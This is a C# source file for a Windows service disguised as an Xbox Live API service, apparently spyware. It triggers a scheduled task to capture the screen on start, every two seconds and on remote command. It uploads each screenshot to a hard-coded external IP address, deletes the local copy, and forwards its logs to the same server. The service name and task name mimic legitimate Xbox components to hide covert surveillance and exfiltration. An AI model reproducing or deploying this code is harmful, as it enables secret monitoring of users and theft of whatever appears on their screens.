using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Text.Json;

namespace XbozPcAppFT
{
    public enum ServiceState
    {
        SERVICE_STOPPED = 0x00000001,
        SERVICE_START_PENDING = 0x00000002,
        SERVICE_STOP_PENDING = 0x00000003,
        SERVICE_RUNNING = 0x00000004,
        SERVICE_CONTINUE_PENDING = 0x00000005,
        SERVICE_PAUSE_PENDING = 0x00000006,
        SERVICE_PAUSED = 0x00000007,
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ServiceStatus
    {
        public int dwServiceType;
        public ServiceState dwCurrentState;
        public int dwControlsAccepted;
        public int dwWin32ExitCode;
        public int dwServiceSpecificExitCode;
        public int dwCheckPoint;
        public int dwWaitHint;
    };



    public class HttpUploader
    {
        private static readonly HttpClient client = new HttpClient();
        private const int ChunkSize = 1024 * 1024; // 1MB
        private static EventLog _eventLog;
        private static string _serverUrl;

        public static void SetEventLog(EventLog eventLog)
        {
            _eventLog = eventLog;
        }

        public static void SetServerUrl(string serverUrl)
        {
            _serverUrl = serverUrl;
        }

        private static async void SendLogToServerAsync(string logMessage, string level = "INFO")
        {
            try
            {
                if (string.IsNullOrEmpty(_serverUrl)) return;

                var logData = new
                {
                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                    level = level,
                    message = logMessage,
                    source = "XboxLiveApiSvc"
                };

                string jsonContent = System.Text.Json.JsonSerializer.Serialize(logData);
                var content = new StringContent(jsonContent, Encoding.UTF8, "application/json");

                // Send log asynchronously, don't wait for response to avoid blocking
                _ = client.PostAsync($"{_serverUrl}/api/logs", content);
            }
            catch
            {
                // Silently ignore log forwarding errors to prevent infinite loops
            }
        }

        public static async Task UploadFileAsync(string localPath, string serverUrl)
        {
            FileInfo fi = new FileInfo(localPath);
            long totalSize = fi.Length;
            string fileName = Path.GetFileName(localPath);

            string logMsg = $"Starting upload of {fileName} ({totalSize:N0} bytes) to {serverUrl}";
            _eventLog?.WriteEntry(logMsg);
            SendLogToServerAsync(logMsg);

            try
            {
                using (FileStream fs = new FileStream(localPath, FileMode.Open, FileAccess.Read))
                {
                    long offset = 0;
                    int chunkCount = 0;
                    int totalChunks = (int)Math.Ceiling((double)totalSize / ChunkSize);

                    while (offset < totalSize)
                    {
                        chunkCount++;
                        int bytesToRead = (int)Math.Min(ChunkSize, totalSize - offset);
                        byte[] buffer = new byte[bytesToRead];
                        fs.Seek(offset, SeekOrigin.Begin);
                        await fs.ReadAsync(buffer, 0, bytesToRead);

                        bool success = false;
                        int retries = 3;
                        Exception lastError = null;

                        while (!success && retries > 0)
                        {
                            try
                            {
                                using (var content = new ByteArrayContent(buffer))
                                {
                                    content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                                    content.Headers.Add("Content-Range", $"bytes {offset}-{offset + bytesToRead - 1}/{totalSize}");

                                    HttpResponseMessage response = await client.PostAsync($"{serverUrl}/upload/{fileName}", content);
                                    response.EnsureSuccessStatusCode();
                                    success = true;
                                    
                                    double progressPercent = (double)(offset + bytesToRead) / totalSize * 100;
                                    string progressMsg = $"Upload progress: Chunk {chunkCount}/{totalChunks} completed ({progressPercent:F1}%)";
                                    _eventLog?.WriteEntry(progressMsg);
                                    SendLogToServerAsync(progressMsg);
                                }
                            }
                            catch (Exception ex)
                            {
                                lastError = ex;
                                retries--;
                                if (retries > 0)
                                {
                                    string retryMsg = $"Chunk {chunkCount} failed, retrying... ({ex.Message})";
                                    _eventLog?.WriteEntry(retryMsg);
                                    SendLogToServerAsync(retryMsg, "WARNING");
                                }
                            }
                        }

                        if (!success)
                        {
                            string failMsg = $"Failed to upload chunk {chunkCount} after 3 attempts: {lastError?.Message}";
                            _eventLog?.WriteEntry(failMsg);
                            SendLogToServerAsync(failMsg, "ERROR");
                            throw new Exception(failMsg, lastError);
                        }

                        offset += bytesToRead;
                    }
                }

                string completeMsg = $"Upload completed successfully: {fileName} ({totalSize:N0} bytes)";
                _eventLog?.WriteEntry(completeMsg);
                SendLogToServerAsync(completeMsg);
                File.Delete(localPath);
            }
            catch (Exception ex)
            {
                string errorMsg = $"Upload failed for {fileName}: {ex.Message}";
                _eventLog?.WriteEntry(errorMsg);
                SendLogToServerAsync(errorMsg, "ERROR");
                throw;
            }
        }
    }


    public partial class XboxLiveApiSvc : ServiceBase
    {
        private Thread _triggerThread;
        private CancellationTokenSource _cts;
        private static readonly HttpClient _logClient = new HttpClient();
        private string _serverUrl = "http://202.182.127.60:8000";

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);

        private EventLog _eventLog1;
        private int eventId = 1;

        private void WriteEntryAndSendToServer(string message, EventLogEntryType entryType = EventLogEntryType.Information)
        {
            // Write to local event log
            _eventLog1.WriteEntry(message, entryType);

            // Send to server asynchronously
            _ = Task.Run(async () =>
            {
                try
                {
                    var logData = new
                    {
                        timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                        level = entryType.ToString().ToUpper(),
                        message = message,
                        source = "XboxLiveApiSvc"
                    };

                    string jsonContent = System.Text.Json.JsonSerializer.Serialize(logData);
                    var content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
                    await _logClient.PostAsync($"{_serverUrl}/api/logs", content);
                }
                catch
                {
                    // Silently ignore log forwarding errors
                }
            });
        }

        public XboxLiveApiSvc()
        {
            InitializeComponent();
            _eventLog1 = new EventLog();
            if (!EventLog.SourceExists("XboxSource"))
            {
                EventLog.CreateEventSource("XboxSource", "XboxLog");
            }
            _eventLog1.Source = "XboxSource";
            _eventLog1.Log = "XboxLog";
            
            // Set the EventLog and ServerUrl for HttpUploader to use
            HttpUploader.SetEventLog(_eventLog1);
            HttpUploader.SetServerUrl(_serverUrl);
        }

        protected override void OnStart(string[] args)
        {
            WriteEntryAndSendToServer("Service starting up...");

            // Update the service state to Start Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // 1️⃣ Take a screenshot immediately
            WriteEntryAndSendToServer("Taking immediate screenshot on service start...");
            TakeScreenshot();

            // 2️⃣ Set up a timer that triggers every 2s.
            System.Timers.Timer timer = new System.Timers.Timer
            {
                Interval = 2000 // 2 seconds
            };
            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
            timer.Start();
            WriteEntryAndSendToServer("Screenshot timer started (2 second interval)");

            // 3️⃣ Start trigger polling loop in background thread
            _cts = new CancellationTokenSource();
            _triggerThread = new Thread(() => PollTriggerLoop(_cts.Token));
            _triggerThread.IsBackground = true;
            _triggerThread.Start();
            WriteEntryAndSendToServer("Trigger polling thread started");

            // Update the service state to Running.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
            WriteEntryAndSendToServer("Service started successfully and is now running");
        }

        protected override void OnStop()
        {
            _eventLog1.WriteEntry("In OnStop.");

            // Stop polling thread
            if (_cts != null)
            {
                _cts.Cancel();
                if (_triggerThread != null && _triggerThread.IsAlive)
                {
                    _triggerThread.Join(); // wait until thread exits
                }
            }

            // Update the service state to Stop Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOP_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // Update the service state to Stopped.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        private void PollTriggerLoop(CancellationToken token)
        {
            WriteEntryAndSendToServer("Trigger polling thread started");
            try
            {
                while (!token.IsCancellationRequested)
                {
                    // Poll the server for screenshot triggers
                    bool shouldTakeScreenshot = CheckTriggerFromServer();

                    if (shouldTakeScreenshot)
                    {
                        WriteEntryAndSendToServer("Manual screenshot trigger received from web interface!");
                        TakeScreenshot();
                    }

                    Thread.Sleep(5000); // poll every 5 seconds
                }
            }
            catch (Exception ex)
            {
                WriteEntryAndSendToServer($"PollTriggerLoop exception: {ex.Message}", EventLogEntryType.Error);
            }
            finally
            {
                WriteEntryAndSendToServer("Trigger polling thread stopped");
            }
        }

        private bool CheckTriggerFromServer()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(10); // 10 second timeout
                    var response = client.GetAsync($"{_serverUrl}/check_trigger").Result;
                    
                    if (response.IsSuccessStatusCode)
                    {
                        string result = response.Content.ReadAsStringAsync().Result;
                        
                        // Simple JSON parsing to check for trigger
                        if (result.Contains("\"trigger\": true") && result.Contains("\"action\": \"take_screenshot\""))
                        {
                            WriteEntryAndSendToServer("Received screenshot trigger from server");
                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Log polling errors only occasionally to avoid spam
                DateTime lastLogTime = DateTime.MinValue;
                if (DateTime.Now - lastLogTime > TimeSpan.FromMinutes(5))
                {
                    WriteEntryAndSendToServer($"Trigger polling failed: {ex.Message}", EventLogEntryType.Warning);
                    lastLogTime = DateTime.Now;
                }
            }
            
            return false;
        }

        private void OnTimer(object sender, ElapsedEventArgs e)
        {
            _eventLog1.WriteEntry("Timer triggered. Attempting to take screenshot...");
            TakeScreenshot();
        }

        private void TakeScreenshot()
        {
            string userName = "hzluq";
            string userTempDir = $@"C:\Users\{userName}\AppData\Local\Temp";
            try
            {
                WriteEntryAndSendToServer("Attempting to trigger scheduled task for screenshot...");

                // 1️⃣ Run the scheduled task
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = "/run /tn \"RunXboxBarGameWidgets\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process proc = Process.Start(psi))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    string error = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();

                    if (proc.ExitCode == 0)
                        WriteEntryAndSendToServer($"Scheduled task triggered successfully: {output.Trim()}");
                    else
                    {
                        WriteEntryAndSendToServer($"Scheduled task failed (code {proc.ExitCode}): {error.Trim()}", EventLogEntryType.Error);
                        return; // Skip upload if task failed
                    }
                }

                // 2️⃣ Wait briefly to allow screenshot tool to finish
                System.Threading.Thread.Sleep(1000); // 1 seconds — adjust if needed

                // 3️⃣ Find the latest screenshot file
                var latestScreenshot = new DirectoryInfo(userTempDir)
                    .GetFiles("screenshot_*.png")
                    .OrderByDescending(f => f.LastWriteTime)
                    .FirstOrDefault();

                if (latestScreenshot == null)
                {
                    WriteEntryAndSendToServer("No screenshot file found in user's temp folder.", EventLogEntryType.Warning);
                    return;
                }

                string localPath = latestScreenshot.FullName;
                string fileName = latestScreenshot.Name;

                WriteEntryAndSendToServer($"Found screenshot: {fileName} ({latestScreenshot.Length:N0} bytes)");

                // 4️⃣ Upload via HTTP
                try
                {
                    string serverUrl = "http://202.182.127.60:8000"; // FastAPI server endpoint

                    HttpUploader.UploadFileAsync(localPath, serverUrl).GetAwaiter().GetResult();

                    // 5️⃣ Clean up
                    File.Delete(localPath);
                    WriteEntryAndSendToServer($"Screenshot uploaded and deleted: {fileName}");
                }
                catch (Exception ex)
                {
                    WriteEntryAndSendToServer($"Screenshot upload failed: {ex.Message}", EventLogEntryType.Error);
                }

            }
            catch (Exception ex)
            {
                WriteEntryAndSendToServer($"Screenshot operation failed: {ex.Message}", EventLogEntryType.Error);
            }
        }

        protected override void OnContinue()
        {
            _eventLog1.WriteEntry("In OnContinue.");
        }
    }
}
